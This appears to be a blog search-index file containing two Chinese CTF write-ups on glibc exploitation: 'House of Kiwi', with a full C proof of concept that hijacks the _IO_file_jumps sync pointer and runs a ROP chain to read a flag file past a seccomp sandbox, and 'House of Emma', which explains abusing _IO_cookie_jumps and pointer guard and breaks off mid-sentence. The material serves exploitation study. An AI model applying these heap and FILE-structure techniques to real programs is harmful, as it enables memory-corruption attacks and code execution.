<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>house-of-Kiwi</title>
      <link href="/2023/11/15/house-of-Kiwi/"/>
      <url>/2023/11/15/house-of-Kiwi/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House_of_Kiwi"></a>House_of_Kiwi</h1><p>在CTF的pwn题里，经常会遇到一些加了沙盒的题目，这种题目通常有下面两种</p><ol><li>劫持 <code>__free_hook</code> 为一些特定的gadget，进行栈的迁移</li><li>劫持 <code>__malloc_hook</code> 为 <code>setcontext + 53/ setcontext + 61</code> 以及劫持 <code>IO_list_all</code> ,使得exit调用 <code>_IO_cleanup</code> 刷新缓冲区的时候读取flag</li></ol><p><code>setcontexnt+61</code> 有原本的rdi控制变成了rdx控制，需要控制rdx寄存器</p><p><strong>缺点</strong>：如果把 <code>exit</code> 替换为 <code>_exit</code> ，由 <code>syscall</code> 调用，就不会走IO去刷新缓冲区，切高版本会取消对hook的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">&lt;setcontext+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">&lt;setcontext+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">&lt;setcontext+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">&lt;setcontext+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">&lt;setcontext+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">&lt;setcontext+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">&lt;setcontext+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">&lt;setcontext+107&gt;:    je     0x7ffff7e31156 &lt;setcontext+294&gt;</span><br><span class="line">-&gt;</span><br><span class="line">&lt;setcontext+294&gt;:    mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">&lt;setcontext+301&gt;:    push   rcx</span><br><span class="line">&lt;setcontext+302&gt;:    mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">&lt;setcontext+306&gt;:    mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">&lt;setcontext+310&gt;:    mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">&lt;setcontext+317&gt;:    mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">&lt;setcontext+321&gt;:    mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">&lt;setcontext+325&gt;:    mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">&lt;setcontext+332&gt;:    xor    eax,eax</span><br><span class="line">&lt;setcontext+334&gt;:    ret</span><br></pre></td></tr></table></figure><h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ol><li>能够触发 <code>__malloc_assert </code> </li><li>能够实现任意地址写</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line"><span class="built_in">fflush</span> (stderr);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的函数中调用了 <code>fllush</code> ，这是个走io的函数，他最终会调用 <code>_IO_file_jumps</code> 中的 <code>sync</code> 指针</p><p>通过调试发现,<code>fllush</code> 调用了 <code>_IO_file_jumps</code> 中的 <code>_IO_file_sync</code> 并且观察发现此时 <strong>RDX</strong> 的值为 <code>_IO_helper_jumps</code> 指针，并且始终为一个固定的地址</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>根据上面所述，我们只需要修改 <code>__IO_file_jumps</code> 中的 <code>__IO_file_sync</code> 为<code>setcontext + 0x61</code> ,修改 <code>_IO_helpers_jumps + 0xA0</code> 为布置好的ROP的地址， <code>_IO_helper_jumps + 0xA8</code>  为ret的地址</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span></span><br><span class="line"><span class="comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setROP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="type">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="type">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> glibc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house-of-emma</title>
      <link href="/2023/11/13/house-of-emma/"/>
      <url>/2023/11/13/house-of-emma/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-emma"><a href="#House-of-emma" class="headerlink" title="House_of_emma"></a>House_of_emma</h1><p>原文：<a href="https://www.anquanke.com/post/id/260614#h2-1">第七届“湖湘杯” House _OF _Emma | 设计思路与解析-安全客 - 安全资讯平台 (anquanke.com)</a></p><h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ol><li>有一个可控地址</li><li>能够触发io</li></ol><h2 id="寻找合法的vtable"><a href="#寻找合法的vtable" class="headerlink" title="寻找合法的vtable"></a>寻找合法的vtable</h2><p>在 <code>vtable</code> 的合法范围内，存在一个<code>_IO_cookie_jumps</code> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line"> JUMP_INIT_DUMMY,</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line"> <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>vtable的检测对于具体位置的监测还是比较宽松的，所以我们可以在一定的范围内对vtable表的起始位置进行偏移，使得我们在调用偏移是固定的情况下，通过偏移来调用表中的任意函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line"> <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line"> <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line"> <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line"> <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">     fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="type">ssize_t</span> n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line"> <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">   fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line"> <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line"> <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">       == <span class="number">-1</span>)</span><br><span class="line">   || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line"> <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line"> <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数内存在任意指针调用并且函数指针来源于 <code>_IO_cookie_file</code> 结构体，这个结构体是 <code>_IO_FILE_plus</code> 的拓展</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function. */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line"> <span class="type">void</span> *__cookie;</span><br><span class="line"> <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">cookie_read_function_t</span> *read;<span class="comment">/* Read bytes. */</span></span><br><span class="line"> <span class="type">cookie_write_function_t</span> *write;<span class="comment">/* Write bytes. */</span></span><br><span class="line"> <span class="type">cookie_seek_function_t</span> *seek;<span class="comment">/* Seek/tell file position. */</span></span><br><span class="line"> <span class="type">cookie_close_function_t</span> *close;<span class="comment">/* Close file. */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>同时，我们注意到，这里的每个函数都会调用自身的一个参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line"><span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line"><span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir);</span><br><span class="line"><span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br></pre></td></tr></table></figure><p>所以我们可以将它当作一个类似于 <code>__free_hook</code> 的结构来利用</p><p><code>__free_hook</code> 结构如下, 它被定义为一个全局的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="type">void</span> *__ptr, <span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们注意到在调用前指针保护，所以我们接下来就要解决指针加密的问题</p><p><code>point_guard</code> 位于 fs:[0x30] 的位置，我们无法直接获得，但是可以利用例如 <code>largebin_attack</code> 的方法进行写入</p><h2 id="一些问题："><a href="#一些问题：" class="headerlink" title="一些问题："></a>一些问题：</h2><p>在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址，且此位置在 FSOP 之前，从而导致程序没有进入 IO 